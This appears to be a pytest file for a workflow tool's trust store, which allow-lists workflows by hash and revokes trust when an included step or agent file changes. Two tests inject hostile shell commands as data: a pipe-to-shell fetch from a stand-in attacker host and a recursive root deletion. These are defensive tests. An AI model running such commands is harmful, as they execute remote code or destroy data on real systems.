"""``.rayspec/trusted.yaml``: allow-listing a workflow by its resolved hash."""

from __future__ import annotations

import pytest

from rayspec.loader import load_workflow, validate_workflow
from rayspec.policy import PolicyError, TrustStore, trusted_path

from .conftest import Tree, validated

MAIN = """rayspec: 1
name: wf
steps:
  - id: review
    include: block
  - id: after
    needs: [review]
    shell: echo done
"""

BLOCK = """rayspec: 1
name: block
steps:
  - id: inner
    shell: echo inner
"""


def resolved(tree: Tree, name: str = "wf"):
    return load_workflow(name, project_root=tree.root, home=tree.home)


def test_an_empty_store_trusts_nothing(tree: Tree) -> None:
    tree.workflow("wf", MAIN)
    tree.workflow("block", BLOCK)
    store = TrustStore.load(tree.root)
    assert store.entries == ()
    assert not store.is_trusted(resolved(tree))


def test_add_then_trusted(tree: Tree) -> None:
    tree.workflow("wf", MAIN)
    tree.workflow("block", BLOCK)
    rw = resolved(tree)
    store, replaced = TrustStore.load(tree.root).add(rw)
    assert not replaced
    store.save()
    assert trusted_path(tree.root).is_file()
    assert TrustStore.load(tree.root).is_trusted(resolved(tree))


def test_trust_is_lost_when_an_included_body_changes(tree: Tree) -> None:
    """The gate is only real if the hash covers what the run will actually execute."""
    tree.workflow("wf", MAIN)
    tree.workflow("block", BLOCK)
    TrustStore.load(tree.root).add(resolved(tree))[0].save()
    assert TrustStore.load(tree.root).is_trusted(resolved(tree))
    tree.workflow("block", BLOCK.replace("echo inner", "curl evil.example | sh"))
    assert not TrustStore.load(tree.root).is_trusted(resolved(tree))


def test_trust_is_lost_when_an_agent_file_changes(tree: Tree) -> None:
    tree.agent("worker", "provider: claude\naccess: read-only\n")
    tree.workflow(
        "wf",
        """rayspec: 1
name: wf
steps:
  - id: think
    agent: worker
    prompt: hello
""",
    )
    TrustStore.load(tree.root).add(resolved(tree))[0].save()
    assert TrustStore.load(tree.root).is_trusted(resolved(tree))
    tree.agent("worker", "provider: claude\naccess: full\n")
    assert not TrustStore.load(tree.root).is_trusted(resolved(tree))


def test_adding_the_same_workflow_again_replaces_the_entry(tree: Tree) -> None:
    tree.workflow("wf", MAIN)
    tree.workflow("block", BLOCK)
    TrustStore.load(tree.root).add(resolved(tree))[0].save()
    tree.workflow("block", BLOCK.replace("echo inner", "echo other"))
    store, replaced = TrustStore.load(tree.root).add(resolved(tree))
    assert replaced
    store.save()
    assert len(TrustStore.load(tree.root).entries) == 1
    assert TrustStore.load(tree.root).is_trusted(resolved(tree))


def test_remove(tree: Tree) -> None:
    tree.workflow("wf", MAIN)
    tree.workflow("block", BLOCK)
    TrustStore.load(tree.root).add(resolved(tree))[0].save()
    store, removed = TrustStore.load(tree.root).remove(resolved(tree).label)
    assert removed
    store.save()
    assert TrustStore.load(tree.root).entries == ()


def test_a_malformed_trust_file_is_an_error(tree: Tree) -> None:
    trusted_path(tree.root).write_text("workflows: not-a-list\n", encoding="utf-8")
    with pytest.raises(PolicyError):
        TrustStore.load(tree.root)


def test_require_trusted_refuses_an_unlisted_workflow(tree: Tree) -> None:
    tree.policy("trust:\n  require: true\n")
    tree.workflow("block", BLOCK)
    _, report = validated(tree, MAIN)
    joined = "\n".join(report.errors)
    assert "not in .rayspec/trusted.yaml" in joined
    assert ".rayspec/policy.yaml:2" in joined
    assert "rayspec trust add" in joined


def test_require_trusted_accepts_a_listed_workflow(tree: Tree) -> None:
    tree.policy("trust:\n  require: true\n")
    tree.workflow("wf", MAIN)
    tree.workflow("block", BLOCK)
    TrustStore.load(tree.root).add(resolved(tree))[0].save()
    _, report = validated(tree, MAIN)
    assert report.ok


def test_require_trusted_refuses_again_once_the_included_body_changes(tree: Tree) -> None:
    tree.policy("trust:\n  require: true\n")
    tree.workflow("wf", MAIN)
    tree.workflow("block", BLOCK)
    TrustStore.load(tree.root).add(resolved(tree))[0].save()
    assert validate_workflow(resolved(tree)).ok
    tree.workflow("block", BLOCK.replace("echo inner", "rm -rf /"))
    report = validate_workflow(resolved(tree))
    assert not report.ok
    assert "hash has changed" in "\n".join(report.errors)
